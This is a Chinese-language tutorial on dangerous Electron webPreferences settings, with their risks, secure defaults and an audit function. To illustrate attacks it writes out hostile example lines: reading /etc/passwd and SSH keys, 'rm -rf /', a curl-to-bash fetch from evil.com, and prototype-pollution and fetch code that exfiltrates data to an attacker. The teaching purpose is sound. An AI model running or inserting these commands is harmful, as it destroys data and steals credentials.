---
title: 哪些配置会造成严重安全漏洞？
category: Electron
difficulty: 高级
updatedAt: 2025-12-11
summary: >-
  列举 Electron 中最危险的配置选项，解释每个配置的风险以及如何正确设置。
tags:
  - Electron
  - 安全
  - 配置
  - 漏洞
estimatedTime: 12 分钟
keywords:
  - 危险配置
  - 安全漏洞
  - webPreferences
highlight: nodeIntegration、contextIsolation、webSecurity 等配置错误会导致严重安全漏洞
order: 39
---

## 问题 1：最危险的配置有哪些？

### 危险配置一览

```javascript
// ❌ 危险配置示例（永远不要这样做）
new BrowserWindow({
  webPreferences: {
    nodeIntegration: true, // 🔴 极度危险
    contextIsolation: false, // 🔴 极度危险
    webSecurity: false, // 🔴 极度危险
    allowRunningInsecureContent: true, // 🔴 危险
    enableRemoteModule: true, // 🟠 危险（已废弃）
    sandbox: false, // 🟠 不推荐
  },
});
```

---

## 问题 2：nodeIntegration: true 的风险

### 风险等级：🔴 极度危险

```javascript
// 开启 nodeIntegration 后，渲染进程可以：
new BrowserWindow({
  webPreferences: {
    nodeIntegration: true, // ❌ 危险
  },
});

// 任何在渲染进程中执行的 JavaScript 都可以：
const fs = require("fs");
const { exec } = require("child_process");

// 读取任意文件
fs.readFileSync("/etc/passwd");
fs.readFileSync("~/.ssh/id_rsa");

// 执行任意命令
exec("rm -rf /");
exec("curl http://evil.com/malware | bash");

// 访问系统信息
const os = require("os");
console.log(os.userInfo());
```

### 攻击场景

```javascript
// 场景 1：XSS 攻击
// 如果页面有任何 XSS 漏洞，攻击者可以执行系统命令

// 场景 2：恶意第三方库
// npm 包中的恶意代码可以完全控制系统

// 场景 3：加载远程内容
win.loadURL("https://compromised-site.com");
// 被入侵的网站可以执行任意代码
```

### 正确做法

```javascript
// ✅ 始终禁用
new BrowserWindow({
  webPreferences: {
    nodeIntegration: false, // 默认值，保持禁用
    preload: path.join(__dirname, "preload.js"),
  },
});
```

---

## 问题 3：contextIsolation: false 的风险

### 风险等级：🔴 极度危险

```javascript
// 关闭上下文隔离后，preload 和页面共享同一个 JavaScript 上下文
new BrowserWindow({
  webPreferences: {
    contextIsolation: false, // ❌ 危险
  },
});
```

### 原型链污染攻击

```javascript
// preload.js
window.myAPI = {
  readFile: (path) => require("fs").readFileSync(path, "utf-8"),
};

// 恶意页面脚本可以：
// 1. 污染原型链
Array.prototype.join = function () {
  // 窃取所有数组数据
  sendToAttacker(this);
  return originalJoin.apply(this, arguments);
};

// 2. 劫持 API
const originalReadFile = window.myAPI.readFile;
window.myAPI.readFile = function (path) {
  sendToAttacker(path); // 记录所有读取的文件
  return originalReadFile(path);
};

// 3. 修改全局对象
Object.defineProperty(Object.prototype, "then", {
  get() {
    // 劫持所有 Promise
    return (resolve) => {
      sendToAttacker("Promise intercepted");
      resolve(this);
    };
  },
});
```

### 正确做法

```javascript
// ✅ 始终启用上下文隔离
new BrowserWindow({
  webPreferences: {
    contextIsolation: true, // 默认值，保持启用
    preload: path.join(__dirname, "preload.js"),
  },
});

// preload.js - 使用 contextBridge
const { contextBridge, ipcRenderer } = require("electron");

contextBridge.exposeInMainWorld("api", {
  readFile: (path) => ipcRenderer.invoke("read-file", path),
});
```

---

## 问题 4：webSecurity: false 的风险

### 风险等级：🔴 极度危险

```javascript
// 禁用 Web 安全策略
new BrowserWindow({
  webPreferences: {
    webSecurity: false, // ❌ 危险
  },
});
```

### 风险说明

```javascript
// 禁用后会：
// 1. 禁用同源策略
// 2. 允许跨域请求
// 3. 允许加载本地文件

// 攻击者可以：
// 从任意网站读取数据
fetch("https://bank.com/api/account")
  .then((r) => r.json())
  .then((data) => sendToAttacker(data));

// 读取本地文件
fetch("file:///etc/passwd")
  .then((r) => r.text())
  .then((content) => sendToAttacker(content));
```

### 正确做法

```javascript
// ✅ 始终启用 Web 安全
new BrowserWindow({
  webPreferences: {
    webSecurity: true, // 默认值，保持启用
  },
});

// 如果需要跨域请求，在主进程中处理
ipcMain.handle("fetch-external", async (event, url) => {
  // 验证 URL
  if (!isAllowedUrl(url)) {
    throw new Error("URL not allowed");
  }

  const response = await fetch(url);
  return response.json();
});
```

---

## 问题 5：其他危险配置

### allowRunningInsecureContent: true

```javascript
// ❌ 允许 HTTPS 页面加载 HTTP 内容
new BrowserWindow({
  webPreferences: {
    allowRunningInsecureContent: true, // 危险
  },
});

// 风险：中间人攻击可以注入恶意脚本
// 正确做法：始终使用 HTTPS
```

### enableRemoteModule: true

```javascript
// ❌ 启用 remote 模块（已废弃）
new BrowserWindow({
  webPreferences: {
    enableRemoteModule: true, // 危险且已废弃
  },
});

// 风险：渲染进程可以直接访问主进程对象
// 正确做法：使用 IPC 通信
```

### sandbox: false

```javascript
// ⚠️ 禁用沙箱
new BrowserWindow({
  webPreferences: {
    sandbox: false, // 不推荐
  },
});

// 风险：渲染进程有更多系统访问权限
// 正确做法：启用沙箱
new BrowserWindow({
  webPreferences: {
    sandbox: true,
  },
});
```

---

## 问题 6：安全配置检查清单

### 推荐的安全配置

```javascript
// ✅ 安全的配置模板
const secureWindowConfig = {
  webPreferences: {
    // 核心安全设置
    nodeIntegration: false,
    contextIsolation: true,
    sandbox: true,

    // Web 安全
    webSecurity: true,
    allowRunningInsecureContent: false,

    // 禁用危险功能
    enableRemoteModule: false,

    // 使用 preload 脚本
    preload: path.join(__dirname, "preload.js"),

    // 其他安全设置
    navigateOnDragDrop: false,
    spellcheck: true,
  },
};

const win = new BrowserWindow(secureWindowConfig);
```

### 安全审计脚本

```javascript
// 检查窗口配置是否安全
function auditWindowSecurity(win) {
  const prefs = win.webContents.getWebPreferences();
  const issues = [];

  if (prefs.nodeIntegration) {
    issues.push("🔴 nodeIntegration 已启用");
  }

  if (!prefs.contextIsolation) {
    issues.push("🔴 contextIsolation 已禁用");
  }

  if (!prefs.sandbox) {
    issues.push("🟠 sandbox 已禁用");
  }

  if (!prefs.webSecurity) {
    issues.push("🔴 webSecurity 已禁用");
  }

  if (issues.length === 0) {
    console.log("✅ 窗口配置安全");
  } else {
    console.log("⚠️ 发现安全问题:");
    issues.forEach((issue) => console.log(issue));
  }

  return issues;
}
```

## 延伸阅读

- [Electron 安全清单](https://www.electronjs.org/docs/latest/tutorial/security)
- [webPreferences 文档](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [Electron 安全最佳实践](https://www.electronjs.org/docs/latest/tutorial/security#checklist-security-recommendations)
